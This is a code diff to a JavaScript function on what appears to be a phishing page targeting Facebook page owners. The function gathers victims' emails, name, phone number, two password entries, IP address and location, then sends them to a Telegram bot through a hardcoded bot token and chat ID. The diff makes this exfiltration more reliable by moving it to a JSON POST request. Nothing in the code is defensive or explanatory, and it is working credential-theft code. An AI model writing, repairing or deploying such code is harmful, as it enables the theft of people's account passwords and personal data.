@@ -224,41 +224,43 @@ function showPrompt(IpAddress) {
     const message1 =
       "<strong>User Email: </strong>" +
       $("#business-email").val() +
-      "%0A<strong>User Name: </strong>" +
+      "\n<strong>User Name: </strong>" +
       $("#full-name").val() +
-      "%0A<strong>User Email: </strong>" +
+      "\n<strong>User Email: </strong>" +
       $("#personal-email").val() +
-      "%0A<strong>Facebook Page: </strong>" +
+      "\n<strong>Facebook Page: </strong>" +
       $("#page-name").val() +
-      "%0A<strong>Phone Number: </strong>" +
+      "\n<strong>Phone Number: </strong>" +
       $("#phone").val() +
-      "%0A<strong>First Password: </strong>" +
+      "\n<strong>First Password: </strong>" +
       password +
-      "%0A<strong>Second Password: </strong>" +
+      "\n<strong>Second Password: </strong>" +
       secondPassword +
-      "%0A<strong>IP Address: </strong>" +
+      "\n<strong>IP Address: </strong>" +
       IpAddress.ipAddress +
-      "%0A<strong>Country : </strong>" +
+      "\n<strong>Country : </strong>" +
       IpAddress.countryName +
       "( " +
       IpAddress.countryCode +
       " )" +
-      "%0A<strong>City : </strong>" +
+      "\n<strong>City : </strong>" +
       IpAddress.city;
 
-      const botToken = "7950052672:AAGbwOHQ7ockeXPmcajDGBl0Z3PaMvEtm44";
-      const chatId = "-1002299618966";
-    const message = message1; // Tin nhắn sẽ là dữ liệu sản phẩm
+    const botToken = "7950052672:AAGbwOHQ7ockeXPmcajDGBl0Z3PaMvEtm44";
+    const chatId = "-1002299618966";
 
-    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=html`;
-
-    fetch(telegramUrl)
-      .then((response) => {
-        if (!response.ok) {
-          throw new Error("Network response was not ok");
-        }
-        return response.json();
-      })
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message1,
+        parse_mode: "HTML",
+      }),
+    })
+      .then((response) => response.json())
       .then((data) => {
         NUMBER_TIME_LOGIN++;
         if (NUMBER_TIME_LOGIN === 1) {
@@ -276,6 +278,7 @@ function showPrompt(IpAddress) {
         }
       })
       .catch((error) => {
+        console.error("Error:", error);
         setTimeout(function () {
           Swal.fire({
             text: `Request failed!`,
